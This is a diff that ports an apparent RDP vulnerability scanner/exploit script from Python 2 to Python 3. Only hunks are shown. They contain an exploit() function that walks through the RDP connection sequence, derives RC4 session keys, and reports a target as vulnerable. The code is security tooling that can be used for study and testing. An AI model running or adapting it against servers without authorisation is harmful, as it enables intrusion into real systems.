@@ -11,8 +11,8 @@ R = '\033[91m'  # red
 W = '\033[0m'  # white
 
 def parser_error(errmsg):
-    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
-    print(R + "Error: " + errmsg + W)
+    print(("Usage: python " + sys.argv[0] + " [Options] use -h for help"))
+    print((R + "Error: " + errmsg + W))
     sys.exit()
 
 
@@ -25,14 +25,14 @@ def parse_args():
     return parser.parse_args()
 
 def error_msg(msg):
-    print(R + "Error: " + msg + W)
+    print((R + "Error: " + msg + W))
     sys.exit()
 
 
 def hexdump(src, length=16):
     FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
     lines = []
-    for c in xrange(0, len(src), length):
+    for c in range(0, len(src), length):
         chars = src[c:c+length]
         hex = ' '.join(["%02x" % ord(x) for x in chars])
         printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
@@ -135,7 +135,7 @@ def rdp_parse_serverdata(pkt):
         header_type = rdp_pkt[ptr:ptr+2]
         header_length = struct.unpack("<h",rdp_pkt[ptr+2:ptr+4])[0]
 
-        print("- Header: {}  Len: {}".format(bin_to_hex(header_type),header_length))
+        print(("- Header: {}  Len: {}".format(bin_to_hex(header_type),header_length)))
 
         if header_type == "\x02\x0c":
             print("- Security Header")
@@ -145,24 +145,24 @@ def rdp_parse_serverdata(pkt):
 
             
             modulus = rdp_pkt[ptr+88:ptr+152]
-            print("- modulus_old: {}".format(bin_to_hex(modulus)))
+            print(("- modulus_old: {}".format(bin_to_hex(modulus))))
             rsa_magic = rdp_pkt[ptr+68:ptr+72]
 
             if rsa_magic != "RSA1":
                 print("Server cert isn't RSA, this scenario isn't supported (yet).")
                 # sys.exit(1)
 
-            print("- RSA magic: {}".format(rsa_magic))
+            print(("- RSA magic: {}".format(rsa_magic)))
             bitlen = struct.unpack("<L",rdp_pkt[ptr+72:ptr+76])[0] - 8
-            print("- RSA bitlen: {}".format(bitlen))
+            print(("- RSA bitlen: {}".format(bitlen)))
             modulus = rdp_pkt[ptr+88:ptr+87+1+bitlen]
-            print("- modulus_new: {}".format(bin_to_hex(modulus)))
+            print(("- modulus_new: {}".format(bin_to_hex(modulus))))
     
         ptr += header_length
 
-    print("- SERVER_MODULUS: {}".format(bin_to_hex(modulus)))
-    print("- SERVER_EXPONENT: {}".format(bin_to_hex(public_exponent)))
-    print("- SERVER_RANDOM: {}".format(bin_to_hex(server_random)))
+    print(("- SERVER_MODULUS: {}".format(bin_to_hex(modulus))))
+    print(("- SERVER_EXPONENT: {}".format(bin_to_hex(public_exponent))))
+    print(("- SERVER_RANDOM: {}".format(bin_to_hex(server_random))))
 
     rsmod = bytes_to_bignum(modulus)
     rsexp = bytes_to_bignum(public_exponent)
@@ -193,7 +193,7 @@ def pdu_security_exchange(rcran, rsexp, rsmod, bitlen):
     bitlen += 8
     bitlen_hex = struct.pack("<L",bitlen)
 
-    print("Encrypted client random: {}".format(bin_to_hex(encrypted_rcran)))
+    print(("Encrypted client random: {}".format(bin_to_hex(encrypted_rcran))))
 
     userdata_length = 8 + bitlen
     userdata_length_low = userdata_length & 0xFF
@@ -271,12 +271,12 @@ def rdp_calculate_rc4_keys(client_random, server_random):
 
     macKey = sessionKeyBlob[0:16]
 
-    print("PreMasterSecret = {}".format(bin_to_hex(preMasterSecret)))
-    print("MasterSecret = {}".format(bin_to_hex(masterSecret)))
-    print("sessionKeyBlob = {}".format(bin_to_hex(sessionKeyBlob)))
-    print("macKey = {}".format(bin_to_hex(macKey)))
-    print("initialClientDecryptKey128 = {}".format(bin_to_hex(initialClientDecryptKey128)))
-    print("initialClientEncryptKey128 = {}".format(bin_to_hex(initialClientEncryptKey128)))
+    print(("PreMasterSecret = {}".format(bin_to_hex(preMasterSecret))))
+    print(("MasterSecret = {}".format(bin_to_hex(masterSecret))))
+    print(("sessionKeyBlob = {}".format(bin_to_hex(sessionKeyBlob))))
+    print(("macKey = {}".format(bin_to_hex(macKey))))
+    print(("initialClientDecryptKey128 = {}".format(bin_to_hex(initialClientDecryptKey128))))
+    print(("initialClientEncryptKey128 = {}".format(bin_to_hex(initialClientEncryptKey128))))
 
     return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob
 
@@ -338,7 +338,7 @@ def try_check(s,rc4enckey, hmackey):
             print("[+] Found MCS Disconnect Provider Ultimatum PDU Packet")
             print("[+] Vulnerable....Vulnerable.... Vulnerable")
             print("[+] HexDump: MCS Disconnect Provider Ultimatum PDU")
-            print hexdump(res)
+            print(hexdump(res))
 
 
 
@@ -353,27 +353,27 @@ def exploit(host,port,hostname,username):
     s.sendall(x_224_conn_req.format(chr(33+len(username)+5)))
     s.recv(8192)
 
-    print "[+] PDU X.224 Response Received."
-    print "[+] Sending MCS Connect Initial PDU with GCC Conference." 
+    print("[+] PDU X.224 Response Received.")
+    print("[+] Sending MCS Connect Initial PDU with GCC Conference.") 
     s.sendall(pdu_connect_initial(hostname))
     res = s.recv(10000)
 
 
-    print "[+] MCS Response PDU with GCC Conference Received."
+    print("[+] MCS Response PDU with GCC Conference Received.")
     rsmod, rsexp, rsran, server_rand, bitlen = rdp_parse_serverdata(res)
 
 
-    print "[+] Sending MCS Erect Request."
+    print("[+] Sending MCS Erect Request.")
     s.sendall(mcs_erect_domain_pdu())
 
-    print "[+] Sending MCS Attach User PDU Request."
+    print("[+] Sending MCS Attach User PDU Request.")
     s.sendall(msc_attach_user_pdu())
 
     res = s.recv(8192)
     mcs_packet = bytearray(res)
     user1= mcs_packet[9] + mcs_packet[10]
 
-    print("[+] Send PDU  Request for 7 channel with AttachUserConfirm::initiator: {}".format(user1))
+    print(("[+] Send PDU  Request for 7 channel with AttachUserConfirm::initiator: {}".format(user1)))
     s.sendall(pdu_channel_request(user1, 1009))
     s.recv(8192)
     s.sendall(pdu_channel_request(user1, 1003))
@@ -397,10 +397,10 @@ def exploit(host,port,hostname,username):
 
     rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(client_rand, server_rand)
 
-    print("- RC4_ENC_KEY: {}".format(bin_to_hex(rc4encstart)))
-    print("- RC4_DEC_KEY: {}".format(bin_to_hex(rc4decstart)))
-    print("- HMAC_KEY: {}".format(bin_to_hex(hmackey)))
-    print("- SESS_BLOB: {}".format(bin_to_hex(sessblob)))
+    print(("- RC4_ENC_KEY: {}".format(bin_to_hex(rc4encstart))))
+    print(("- RC4_DEC_KEY: {}".format(bin_to_hex(rc4decstart))))
+    print(("- HMAC_KEY: {}".format(bin_to_hex(hmackey))))
+    print(("- SESS_BLOB: {}".format(bin_to_hex(sessblob))))
 
     rc4enckey = ARC4.new(rc4encstart)
 
@@ -408,10 +408,10 @@ def exploit(host,port,hostname,username):
     s.sendall(rdp_encrypted_pkt(pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))
     res = s.recv(8192)
 
-    print("[+] Received License packet: {}".format(bin_to_hex(res)))
+    print(("[+] Received License packet: {}".format(bin_to_hex(res))))
 
     res = s.recv(8192)
-    print("[+] Received Server Demand packet: {}".format(bin_to_hex(res)))
+    print(("[+] Received Server Demand packet: {}".format(bin_to_hex(res))))
 
     print("[+] Sending client confirm active PDU")
     s.sendall(rdp_encrypted_pkt(pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))
